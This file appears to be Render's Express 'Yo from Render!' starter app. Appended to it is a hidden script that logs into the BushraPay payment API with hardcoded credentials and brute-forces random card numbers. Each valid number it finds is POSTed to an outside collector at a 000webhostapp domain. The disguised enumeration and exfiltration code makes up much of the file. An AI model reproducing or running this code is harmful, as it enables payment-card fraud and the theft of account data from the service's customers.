const express = require("express");
const app = express();
const port = process.env.PORT || 3001;

app.get("/", (req, res) => res.type('html').send(html));

app.listen(port, () => console.log(`Example app listening on port ${port}!`));
var i = 0;
const html = `
<!DOCTYPE html>
<html>
  <head>
    <title>Yo from Render!</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <script>
      setTimeout(() => {
        confetti({
          particleCount: 100,
          spread: 70,
          origin: { y: 0.6 },
          disableForReducedMotion: true
        });
      }, 500);
    </script>
    <style>
      @import url("https://p.typekit.net/p.css?s=1&k=vnd5zic&ht=tk&f=39475.39476.39477.39478.39479.39480.39481.39482&a=18673890&app=typekit&e=css");
      @font-face {
        font-family: "neo-sans";
        src: url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff2"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("opentype");
        font-style: normal;
        font-weight: 700;
      }
      html {
        font-family: neo-sans;
        font-weight: 700;
        font-size: calc(62rem / 16);
      }
      body {
        background: white;
      }
      section {
        border-radius: 1em;
        padding: 1em;
        position: absolute;
        top: 50%;
        left: 50%;
        margin-right: -50%;
        transform: translate(-50%, -50%);
      }
    </style>
  </head>
  <body>
    <section>
      Yo from Render!
    </section>
  </body>
</html>
`//import fetch from 'node-fetch'; 
const fetch = require('node-fetch'); 
const fs = require('fs'); 
 
 
var token 
function fish(){ 
var card = "6391750"+gennum(9); 
 
fetch('https://app.bushrapay.com/API/do/LoginNoImage', { 
    method: 'POST', 
    headers: { 
        'Content-Type': 'application/json; charset=utf-8', 
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; SM-A105F Build/PPR1.180610.011)', 
        'Host': 'app.bushrapay.com', 
        'Connection': 'Keep-Alive', 
        'Accept-Encoding': 'gzip', 
        'Content-Length': '200' 
    }, 
    body: JSON.stringify({ 
  "MobileVersion": "1.0.8", 
  "Lang": "en", 
  "Phone": "+249125774806", 
  "Password": 
  "b16edd5ba7867c0d5a4192d0f78bbfce21156865", 
  "LastUpdate": "2022-12-02 11:57:18", 
  "PlayerID": "exa0hwhd-6g7i-4701-ae04-83ba6"+gennum(7) 
}) 
}).then(response=>response.json()).then(data=>{ 
token = data.Infos["Token"]; 
 
  if(token == null){ 
    console.log("Account Locked") 
     
  }else{ 
fetch('https://app.bushrapay.com/API/do/Trans', { 
    method: 'POST', 
    headers: { 
        'Authorization': 'Bearer '+token, 
        'Content-Type': 'application/json; charset=utf-8', 
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; SM-A105F Build/PPR1.180610.011)' 
    }, 
    body: JSON.stringify({ 
        'TransID':'4977'+gennum(4)+'-'+gennum(4)+'-'+gennum(4)+'-'+gennum(4)+'-41a140fa0c38' , 
   // 49775629-1b57-41de-9ad9-41a140fa0c38 
        'Fields': [ 
            { 
                'FieldID': 'd5c60415-04d8-408a-914f-0f253d62a9e1', 
                'Msg': '', 
                'Name': 'To Card', 
                'InqServiceFieldID': 'd5c60415-04d8-408a-914f-0f253d62a9e1', 
                'Value': card 
            } 
        ], 
        'ServiceID': 'ff1d0a51-4546-49c8-9274-947b39982e67', 
        'PaymentMethod': 'P', 
        'Lang': 'en' 
    }) 
}).then(response => response.json()).then(data=>{ 
  //console.log(data) 
  if(data.Status == true){ 
//fs.appendFile("live.txt",card+"\n",function (err) {if (err) throw err;console.log('Success! '+card);}); 
 fetch('https://renoche.000webhostapp.com/collector/accounts.php', {
    method: 'POST',

    headers: {
        'Content-Type': 'application/json; charset=utf-8',
        'User-Agent': 'okhttp/4.9.1',
        'Version': '100',
        'Accept-Encoding': 'gzip',
      
    },
    body: JSON.stringify(
{"id":card}
)
})
console.log(card) 
  }else if(data.Status == false){ 
//fs.appendFile("error.txt","["+i+"]"+card+"\n",function (err) {if (err) throw err;}); 
//console.log("not Active") 
  fish() 
     
  } 
}); 
 
} // close if 
}); 
} 
//clearInterval(timer) 
 
fish() 
 
function gennum(length) { 
    var result           = ''; 
    var characters       = '0123456789'; 
    //ABCDEFGHIJKLMNOPQRSTUVWXYZ 
    var charactersLength = characters.length; 
    for ( var i = 0; i < length; i++ ) { 
        result += characters.charAt(Math.floor(Math.random() * charactersLength)); 
    } 
    return result; 
} 
 
function pad(num, size) { 
    var s = "000000000" + num; 
    return s.substr(s.length-size); 
} 
function gen(length) { 
    var result           = ''; 
    var characters       = 'abcdefghijklmnopqrstuvwxyz0123456789'; 
    //ABCDEFGHIJKLMNOPQRSTUVWXYZ 
    var charactersLength = characters.length; 
    for ( var i = 0; i < length; i++ ) { 
        result += characters.charAt(Math.floor(Math.random() * charactersLength)); 
    } 
    return result; 
}
